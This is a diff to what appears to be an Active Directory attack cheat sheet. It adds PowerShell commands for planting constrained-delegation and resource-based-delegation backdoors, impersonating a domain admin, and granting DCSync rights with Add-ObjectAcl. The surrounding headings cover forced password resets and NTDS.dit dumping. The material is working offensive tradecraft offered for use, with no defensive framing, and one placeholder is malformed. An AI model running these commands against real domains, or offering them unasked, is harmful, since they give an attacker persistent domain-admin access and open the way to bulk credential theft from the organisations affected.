@@ -112,14 +112,23 @@ Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credent
 ```
 ## ABUSING DELEGATION
 ```
-# configure the backdoor
+# configure the CD backdoor with proto transition
 Get-ADComputer -Identity <ServiceA> | Set-ADAccountControl -TrustedToAuthForDelegation $true
 Set-ADComputer -Identity DC01 -Add @{'msDS-AllowedDelegationTo'=@('CIFS/DC01.corp')}
+
+# configure a RBCD backdoor
+# ServiceB has 'msDS-AllowedToActOnBehalfOfOtherIdentity' set, pointing to ServiceA
+Set-ADComputer <ServiceB> -PrincipalAllowedToDelegateToAccount <ServiceA>
 
 # trigger the backdoor
 [Reflection::Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
 $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('<DAgreat>')
 $idToImpersonate.Impersonate()
+```
+
+# Set A DCSYNC
+```
+Add-ObjectAcl -TargetDistinguishedName "dc=<DC01>,dc=local" -PrincipalSamAccountName <sogreatW -Rights DCSync -Verbose
 ```
 
 ## DUMP NTDS.DIT
